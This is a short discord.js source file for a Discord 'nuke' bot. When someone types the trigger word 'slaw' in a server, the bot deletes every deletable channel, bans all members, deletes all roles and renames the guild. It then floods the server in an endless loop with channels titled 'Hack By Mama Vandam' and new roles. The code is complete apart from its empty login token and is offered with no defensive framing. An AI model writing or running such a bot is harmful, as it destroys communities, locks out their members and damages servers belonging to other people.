const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "";
client.on("message", message => {
  if (message.content === "slaw") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Tanha Agadarman Krdyawa");
      setInterval(function() {
        message.guild.createChannel(" Hack By Mama Vandam 🦍", "voice");
        message.guild.createChannel(" Hack By Mama Vandam 🦍", "text");
        message.guild.createRole({ name: " لەرەی گوورگ" });
      });
    }
  }
});

client.login("");
